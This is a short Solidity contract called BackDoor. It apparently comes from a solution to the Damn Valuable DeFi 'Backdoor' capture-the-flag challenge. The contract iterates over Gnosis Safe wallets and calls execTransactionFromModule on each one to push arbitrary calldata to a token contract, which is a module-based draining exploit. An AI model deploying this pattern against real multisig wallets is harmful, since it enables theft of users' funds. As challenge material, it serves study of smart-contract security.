//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";

contract BackDoor {
    DamnValuableToken public token;
    GnosisSafe public wallet;
    address public player;
    uint256 public amount = 10 ether;

    constructor(address _token, address _player) {
        token = DamnValuableToken(_token);

        player = _player;
    }

    function execute(address payable[] memory _wallets, bytes memory data)
        public
    {
        address payable[] memory wallets = _wallets;
        for (uint i = 0; i < wallets.length; i++) {
            wallet = GnosisSafe(wallets[i]);
            wallet.execTransactionFromModule(
                address(token),
                0,
                data,
                Enum.Operation.Call
            );
        }
    }
}
